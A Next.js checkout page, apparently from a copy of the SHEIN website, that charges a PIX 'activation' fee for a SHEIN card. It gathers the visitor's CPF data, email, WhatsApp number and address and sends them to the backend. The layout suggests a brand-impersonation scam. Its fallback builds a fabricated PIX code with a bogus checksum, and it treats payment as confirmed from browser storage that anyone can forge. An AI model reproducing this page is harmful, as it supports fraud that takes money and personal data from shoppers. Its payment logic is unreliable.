"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import Image from "next/image"
import { Copy, CheckCircle, Clock, AlertCircle, RefreshCw, Smartphone, Zap, Shield } from "lucide-react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { useSuperpayPureWebhook } from "@/hooks/use-superpay-pure-webhook"
import { useOptimizedTracking } from "@/hooks/use-optimized-tracking"
import { SmartQRCode } from "@/components/smart-qr-code"

interface InvoiceData {
  id: string
  invoice_id: string
  external_id: string
  pix: {
    payload: string
    image: string
    qr_code: string
  }
  status: {
    code: number
    title: string
    text: string
  }
  valores: {
    bruto: number
    liquido: number
  }
  vencimento: {
    dia: string
  }
  type: "real" | "simulated" | "emergency"
}

export default function SuperPayCheckoutPage() {
  const [loading, setLoading] = useState(true)
  const [invoice, setInvoice] = useState<InvoiceData | null>(null)
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutos
  const [copied, setCopied] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [isRedirecting, setIsRedirecting] = useState(false)

  const router = useRouter()
  const searchParams = useSearchParams()
  const timerRef = useRef<NodeJS.Timeout | null>(null)

  // Obter parâmetros da URL
  const amount = searchParams.get("amount") || "10.00"
  const shipping = searchParams.get("shipping") || "activation"
  const method = searchParams.get("method") || "PIX"

  // Optimized tracking
  const { track, trackPageView, trackConversion } = useOptimizedTracking({
    enableDebug: process.env.NODE_ENV === "development",
  })

  // SuperPay PURE webhook monitoring (SEM POLLING!)
  const {
    paymentStatus,
    isWaitingForWebhook,
    error: webhookError,
    checkNow,
  } = useSuperpayPureWebhook({
    externalId: invoice?.external_id || "",
    enableDebug: true,
    onPaymentConfirmed: (data) => {
      console.log("🎉🎉🎉 PAGAMENTO CONFIRMADO VIA WEBHOOK SUPERPAY!")
      console.log("💰 Dados do pagamento:", data)

      setIsRedirecting(true)

      // Track conversion
      trackConversion("payment_confirmed_superpay", data.amount)

      // Salvar confirmação no localStorage
      localStorage.setItem("paymentConfirmed", "true")
      localStorage.setItem("paymentAmount", data.amount.toString())
      localStorage.setItem("paymentDate", data.paymentDate || new Date().toISOString())
      localStorage.setItem("paymentGateway", "superpay")

      // Redirecionar após 2 segundos (igual TryploPay)
      setTimeout(() => {
        console.log("🚀 Redirecionando para página de ativação...")
        router.push("/upp/001")
      }, 2000)
    },
    onPaymentDenied: (data) => {
      console.log("❌ PAGAMENTO NEGADO VIA WEBHOOK SUPERPAY!")
      console.log("🚫 Dados:", data)
      track("payment_denied_superpay", { amount: data.amount, reason: data.statusName })
      setError(`Pagamento negado: ${data.statusName}`)
    },
    onPaymentExpired: (data) => {
      console.log("⏰ PAGAMENTO VENCIDO VIA WEBHOOK SUPERPAY!")
      console.log("📅 Dados:", data)
      track("payment_expired_superpay", { amount: data.amount })
      setError("Pagamento vencido. Gere um novo PIX.")
    },
    onPaymentCanceled: (data) => {
      console.log("🚫 PAGAMENTO CANCELADO VIA WEBHOOK SUPERPAY!")
      console.log("❌ Dados:", data)
      track("payment_canceled_superpay", { amount: data.amount })
      setError("Pagamento cancelado.")
    },
    onPaymentRefunded: (data) => {
      console.log("🔄 PAGAMENTO ESTORNADO VIA WEBHOOK SUPERPAY!")
      console.log("💸 Dados:", data)
      track("payment_refunded_superpay", { amount: data.amount })
      setError("Pagamento estornado.")
    },
    onError: (errorMsg) => {
      console.error("❌ Erro no monitoramento SuperPay:", errorMsg)
      setError(`Erro no monitoramento: ${errorMsg}`)
    },
  })

  // Track page view on mount
  useEffect(() => {
    trackPageView("/checkout")
    track("checkout_page_loaded_superpay", {
      amount: Number.parseFloat(amount),
      shipping_method: method,
    })
  }, [trackPageView, track, amount, method])

  // Timer countdown
  useEffect(() => {
    if (timeLeft > 0 && invoice && !paymentStatus.isPaid && !isRedirecting) {
      timerRef.current = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
    } else if (timeLeft === 0) {
      setError("Tempo expirado. Gere um novo PIX.")
      track("payment_timeout_superpay", { amount: Number.parseFloat(amount) })
    }

    return () => {
      if (timerRef.current) clearTimeout(timerRef.current)
    }
  }, [timeLeft, invoice, paymentStatus.isPaid, isRedirecting, track, amount])

  // Carregar dados do usuário e criar fatura
  useEffect(() => {
    createInvoice()
  }, [])

  // Debug: Log status changes
  useEffect(() => {
    console.log("🔄 Status SuperPay atualizado:", {
      isPaid: paymentStatus.isPaid,
      isDenied: paymentStatus.isDenied,
      isExpired: paymentStatus.isExpired,
      isCanceled: paymentStatus.isCanceled,
      isRefunded: paymentStatus.isRefunded,
      statusName: paymentStatus.statusName,
      lastUpdate: paymentStatus.lastUpdate,
      isWaitingForWebhook,
      externalId: invoice?.external_id,
    })
  }, [paymentStatus, isWaitingForWebhook, invoice?.external_id])

  const createInvoice = async () => {
    try {
      setLoading(true)
      setError(null)

      console.log("🔄 Criando fatura PIX SuperPay...")
      console.log("Parâmetros:", { amount: Number.parseFloat(amount), shipping, method })

      // Track invoice creation start
      track("invoice_creation_started_superpay", {
        amount: Number.parseFloat(amount),
        shipping_method: method,
      })

      // Carregar dados do usuário do localStorage
      const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
      const userEmail = localStorage.getItem("userEmail") || ""
      const userWhatsApp = localStorage.getItem("userWhatsApp") || ""
      const deliveryAddress = JSON.parse(localStorage.getItem("deliveryAddress") || "{}")

      console.log("📋 Dados do usuário SuperPay:", {
        nome: cpfData.nome,
        email: userEmail,
        whatsapp: userWhatsApp,
        endereco: deliveryAddress,
      })

      const response = await fetch("/api/superpaybr/create-activation-invoice", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-cpf-data": JSON.stringify(cpfData),
          "x-user-email": userEmail,
          "x-user-whatsapp": userWhatsApp,
          "x-delivery-address": JSON.stringify(deliveryAddress),
        },
        body: JSON.stringify({
          amount: Number.parseFloat(amount),
          shipping,
          method,
          description: "Ativação do Cartão SHEIN",
        }),
      })

      const data = await response.json()

      if (data.success && data.data) {
        const invoiceData = data.data
        setInvoice(invoiceData)

        // Salvar no localStorage
        localStorage.setItem("superPayInvoice", JSON.stringify(invoiceData))
        localStorage.setItem("currentExternalId", invoiceData.external_id)

        console.log("✅ Fatura SuperPay criada com sucesso:")
        console.log(`- External ID: ${invoiceData.external_id}`)
        console.log(`- Invoice ID: ${invoiceData.invoice_id}`)
        console.log(`- Valor: R$ ${(invoiceData.valores.bruto / 100).toFixed(2)}`)
        console.log(`- Tipo: ${invoiceData.type}`)
        console.log("🔔 Webhook configurado: https://v0-copy-shein-website.vercel.app/api/superpay/webhook")
        console.log("🚫 POLLING DESABILITADO - Sistema 100% webhook")

        // Track successful invoice creation
        track("invoice_created_superpay", {
          external_id: invoiceData.external_id,
          amount: invoiceData.valores.bruto / 100,
          type: invoiceData.type,
          customer_name: cpfData.nome,
        })
      } else {
        throw new Error(data.error || "Erro ao criar fatura SuperPay")
      }
    } catch (error) {
      console.error("❌ Erro ao criar fatura SuperPay:", error)
      setError("Erro ao gerar PIX SuperPay. Tente novamente.")

      // Track error
      track("invoice_creation_error_superpay", {
        error: error instanceof Error ? error.message : "Unknown error",
        amount: Number.parseFloat(amount),
      })

      createEmergencyPix()
    } finally {
      setLoading(false)
    }
  }

  const createEmergencyPix = () => {
    console.log("🚨 Criando PIX de emergência SuperPay...")

    const totalAmount = Number.parseFloat(amount)
    const emergencyExternalId = `FRETE_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.superpay.${emergencyExternalId}520400005303986540${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`

    const emergencyInvoice: InvoiceData = {
      id: `EMG_${Date.now()}`,
      invoice_id: `EMERGENCY_${Date.now()}`,
      external_id: emergencyExternalId,
      pix: {
        payload: emergencyPix,
        image: "/placeholder.svg?height=250&width=250",
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200&margin=1&format=png`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(totalAmount * 100),
        liquido: Math.round(totalAmount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "emergency",
    }

    setInvoice(emergencyInvoice)
    setError(null)

    // Salvar no localStorage
    localStorage.setItem("superPayInvoice", JSON.stringify(emergencyInvoice))
    localStorage.setItem("currentExternalId", emergencyExternalId)

    console.log(`✅ PIX de emergência SuperPay criado - External ID: ${emergencyExternalId}`)

    // Track emergency PIX creation
    track("emergency_pix_created_superpay", {
      amount: totalAmount,
      external_id: emergencyExternalId,
    })
  }

  const copyPixCode = async () => {
    if (!invoice) return

    try {
      await navigator.clipboard.writeText(invoice.pix.payload)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)

      // Track PIX code copy
      track("pix_code_copied_superpay", {
        external_id: invoice.external_id,
        amount: Number.parseFloat(amount),
      })
    } catch (error) {
      console.error("❌ Erro ao copiar:", error)
    }
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Função para simular pagamento (apenas para testes)
  const simulatePayment = async () => {
    if (!invoice?.external_id) {
      console.error("❌ Não é possível simular: External ID não encontrado")
      return
    }

    try {
      console.log("🧪 Simulando pagamento SuperPay para:", invoice.external_id)

      // Simular dados do webhook diretamente no localStorage
      const webhookKey = `webhook_payment_${invoice.external_id}`
      const simulatedData = {
        isPaid: true,
        isDenied: false,
        isExpired: false,
        isCanceled: false,
        isRefunded: false,
        statusCode: 5,
        statusName: "Pago",
        amount: Number.parseFloat(amount),
        paymentDate: new Date().toISOString(),
        invoiceId: invoice.invoice_id,
        timestamp: new Date().toISOString(),
      }

      localStorage.setItem(webhookKey, JSON.stringify(simulatedData))
      console.log("✅ Dados simulados salvos no localStorage:", webhookKey)

      track("payment_simulated_superpay", {
        external_id: invoice.external_id,
        amount: Number.parseFloat(amount),
      })

      // Forçar verificação imediata
      setTimeout(() => {
        console.log("🔄 Forçando verificação imediata...")
        checkNow()
      }, 500)
    } catch (error) {
      console.error("❌ Erro na simulação SuperPay:", error)
    }
  }

  if (loading) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <Card className="w-full max-w-md mx-4">
          <CardContent className="flex flex-col items-center justify-center p-8">
            <RefreshCw className="h-12 w-12 animate-spin text-purple-600 mb-4" />
            <h2 className="text-xl font-bold mb-2">Gerando PIX SuperPay...</h2>
            <p className="text-gray-600 mb-2">Aguarde enquanto processamos seu pagamento</p>
            <div className="text-sm text-gray-500 text-center">
              <p>Valor: R$ {Number.parseFloat(amount).toFixed(2)}</p>
              <p>Método: {method}</p>
              <p>Sistema: SuperPay + Webhook Puro</p>
            </div>
          </CardContent>
        </Card>
      </main>
    )
  }

  if (error && !invoice) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <Card className="w-full max-w-md mx-4">
          <CardContent className="text-center p-8">
            <AlertCircle className="w-12 h-12 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-bold mb-2 text-red-600">Erro no Pagamento</h2>
            <p className="text-gray-600 mb-4">{error}</p>
            <Button onClick={createInvoice} className="w-full">
              Tentar Novamente
            </Button>
          </CardContent>
        </Card>
      </main>
    )
  }

  return (
    <main className="min-h-screen bg-gray-50">
      <div className="max-w-4xl mx-auto p-4">
        {/* Header */}
        <div className="text-center mb-6">
          <Image src="/shein-card-logo-new.png" alt="SHEIN Card" width={100} height={60} className="mx-auto mb-4" />
          <h1 className="text-2xl font-bold mb-2">Pagamento PIX SuperPay</h1>
          <p className="text-gray-600">Complete o pagamento para ativar seu cartão SHEIN</p>
        </div>

        {/* System Info Alert */}
        <Alert className="mb-6 border-blue-200 bg-blue-50">
          <Shield className="h-4 w-4" />
          <AlertDescription>
            <div className="flex items-center gap-2">
              <Zap className="h-4 w-4 text-blue-600" />
              <span className="font-bold text-blue-800">Sistema 100% Webhook SuperPay</span>
            </div>
            <p className="text-blue-700 text-sm mt-1">
              Detecção automática via notificação da adquirente • Sem polling para evitar rate limiting
            </p>
          </AlertDescription>
        </Alert>

        {/* Success Message - Only show when paid or redirecting */}
        {(paymentStatus.isPaid || isRedirecting) && (
          <Alert className="mb-6 border-green-200 bg-green-50">
            <CheckCircle className="h-4 w-4" />
            <AlertDescription>
              <div className="flex items-center gap-2">
                <span className="font-bold text-green-800">✅ Pagamento Confirmado via SuperPay!</span>
                {isRedirecting && <RefreshCw className="h-4 w-4 animate-spin" />}
              </div>
              <p className="text-green-700 text-sm mt-1">
                {isRedirecting ? "Redirecionando para ativação do cartão..." : "Processando confirmação..."}
              </p>
            </AlertDescription>
          </Alert>
        )}

        {/* Error Message */}
        {error && (
          <Alert className="mb-6 border-red-200 bg-red-50">
            <AlertCircle className="h-4 w-4" />
            <AlertDescription>
              <span className="font-bold text-red-800">Erro:</span> {error}
            </AlertDescription>
          </Alert>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Payment Info */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Smartphone className="h-5 w-5" />
                Detalhes do Pagamento
              </CardTitle>
              <CardDescription>SuperPay + Webhook Puro - Detecção automática sem polling</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-600">Valor:</span>
                <span className="text-lg font-bold text-green-600">R$ {Number.parseFloat(amount).toFixed(2)}</span>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-600">External ID:</span>
                <span className="text-sm font-mono bg-gray-100 px-2 py-1 rounded">
                  {invoice?.external_id || "Carregando..."}
                </span>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-600">Status:</span>
                <div className="flex items-center gap-2">
                  {paymentStatus.isPaid ? (
                    <Badge className="bg-green-500">
                      <CheckCircle className="h-3 w-3 mr-1" />
                      Pago
                    </Badge>
                  ) : paymentStatus.isDenied ? (
                    <Badge variant="destructive">
                      <AlertCircle className="h-3 w-3 mr-1" />
                      Negado
                    </Badge>
                  ) : paymentStatus.isExpired ? (
                    <Badge variant="secondary">
                      <Clock className="h-3 w-3 mr-1" />
                      Vencido
                    </Badge>
                  ) : (
                    <Badge variant="outline">
                      <Clock className="h-3 w-3 mr-1" />
                      Aguardando Webhook
                    </Badge>
                  )}
                </div>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-600">Monitoramento:</span>
                <div className="flex items-center gap-2">
                  {isWaitingForWebhook ? (
                    <Badge className="bg-blue-500">
                      <Zap className="h-3 w-3 mr-1" />
                      Aguardando Webhook
                    </Badge>
                  ) : (
                    <Badge className="bg-green-500">
                      <CheckCircle className="h-3 w-3 mr-1" />
                      Webhook Recebido
                    </Badge>
                  )}
                </div>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-600">Tempo restante:</span>
                <div className="flex items-center gap-2">
                  <Clock className="h-4 w-4 text-orange-500" />
                  <span className={`font-mono text-lg ${timeLeft < 60 ? "text-red-500" : "text-orange-500"}`}>
                    {formatTime(timeLeft)}
                  </span>
                </div>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-600">Sistema:</span>
                <div className="flex items-center gap-2">
                  <Badge variant="outline" className="bg-purple-50">
                    <Shield className="h-3 w-3 mr-1" />
                    Webhook Puro
                  </Badge>
                </div>
              </div>

              {(webhookError || error) && (
                <Alert className="border-red-200 bg-red-50">
                  <AlertCircle className="h-4 w-4" />
                  <AlertDescription>{webhookError || error}</AlertDescription>
                </Alert>
              )}
            </CardContent>
          </Card>

          {/* QR Code */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Smartphone className="h-5 w-5" />
                PIX SuperPay
              </CardTitle>
              <CardDescription>Escaneie o QR Code ou copie o código PIX</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex justify-center">
                {invoice && (
                  <SmartQRCode invoice={invoice} width={200} height={200} className="border rounded-lg p-4 bg-white" />
                )}
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium text-gray-700">Código PIX:</label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={invoice?.pix.payload || ""}
                    readOnly
                    className="flex-1 px-3 py-2 border border-gray-300 rounded-md bg-gray-50 text-sm font-mono"
                  />
                  <Button onClick={copyPixCode} size="sm" variant="outline">
                    {copied ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
                {copied && <p className="text-green-600 text-sm">✅ Código copiado!</p>}
              </div>

              <div className="text-center space-y-2">
                <p className="text-sm text-gray-600">Abra o app do seu banco e escaneie o QR Code</p>
                <p className="text-xs text-gray-500">Ou copie e cole o código PIX no seu app</p>
                <p className="text-xs text-blue-600 font-medium">⚡ Detecção automática via webhook SuperPay</p>
              </div>

              {/* Manual check button */}
              <Button
                onClick={checkNow}
                variant="outline"
                className="w-full bg-transparent"
                disabled={!invoice?.external_id}
              >
                <RefreshCw className="h-4 w-4 mr-2" />
                Verificar localStorage Agora
              </Button>

              {/* Simulação para desenvolvimento */}
              {process.env.NODE_ENV === "development" && invoice?.external_id && (
                <div className="pt-4 border-t">
                  <p className="text-xs text-gray-500 mb-2">Ambiente de desenvolvimento</p>
                  <Button
                    onClick={simulatePayment}
                    disabled={paymentStatus.isPaid || isRedirecting}
                    size="sm"
                    className="w-full bg-green-600 hover:bg-green-700"
                  >
                    🧪 SIMULAR WEBHOOK SUPERPAY
                  </Button>
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        {/* Rate Limit Protection Info */}
        <Card className="mt-6 border-purple-200 bg-purple-50">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-purple-800">
              <Shield className="h-5 w-5" />
              Proteção contra Rate Limiting SuperPay
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
              <div>
                <h4 className="font-medium mb-2 text-purple-800">Sistema Webhook Puro:</h4>
                <ul className="space-y-1 text-purple-700">
                  <li>• ✅ Notificações automáticas da adquirente</li>
                  <li>• ✅ Detecção via localStorage (sem API calls)</li>
                  <li>• ✅ Redirecionamento automático quando pago</li>
                  <li>• ✅ Zero polling para evitar bloqueios</li>
                </ul>
              </div>
              <div>
                <h4 className="font-medium mb-2 text-purple-800">Rate Limiting SuperPay:</h4>
                <ul className="space-y-1 text-purple-700">
                  <li>• ⚠️ 5min → 30min → 1h → 12h → 24h → 48h</li>
                  <li>• ⚠️ Bloqueio permanente após 100h</li>
                  <li>• ✅ Webhook configurado corretamente</li>
                  <li>• ✅ APIs de consulta bloqueadas preventivamente</li>
                </ul>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Debug Info */}
        {process.env.NODE_ENV === "development" && (
          <Card className="mt-6 border-dashed">
            <CardHeader>
              <CardTitle className="text-sm">Debug - Sistema SuperPay Webhook Puro</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-xs">
                <div>
                  <span className="text-gray-500">External ID:</span>
                  <p className="font-mono">{invoice?.external_id || "N/A"}</p>
                </div>
                <div>
                  <span className="text-gray-500">Webhook Status:</span>
                  <p className={isWaitingForWebhook ? "text-blue-600" : "text-green-600"}>
                    {isWaitingForWebhook ? "Aguardando" : "Recebido"}
                  </p>
                </div>
                <div>
                  <span className="text-gray-500">Última verificação:</span>
                  <p>{paymentStatus.lastUpdate ? new Date(paymentStatus.lastUpdate).toLocaleTimeString() : "N/A"}</p>
                </div>
                <div>
                  <span className="text-gray-500">Storage:</span>
                  <p className="text-purple-600">localStorage Only</p>
                </div>
              </div>
              <div className="mt-4 p-3 bg-gray-100 rounded text-xs">
                <p>
                  <strong>Status atual:</strong>{" "}
                  {JSON.stringify(
                    {
                      isPaid: paymentStatus.isPaid,
                      isDenied: paymentStatus.isDenied,
                      isExpired: paymentStatus.isExpired,
                      isCanceled: paymentStatus.isCanceled,
                      statusName: paymentStatus.statusName,
                      isWaitingForWebhook,
                      isRedirecting,
                      source: paymentStatus.source,
                    },
                    null,
                    2,
                  )}
                </p>
              </div>
              <div className="mt-2 p-3 bg-purple-100 rounded text-xs">
                <p>
                  <strong>Webhook URL:</strong> https://v0-copy-shein-website.vercel.app/api/superpay/webhook
                </p>
                <p>
                  <strong>localStorage Key:</strong> webhook_payment_{invoice?.external_id || "N/A"}
                </p>
                <p>
                  <strong>Polling:</strong> ❌ DESABILITADO (Rate limit protection)
                </p>
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </main>
  )
}
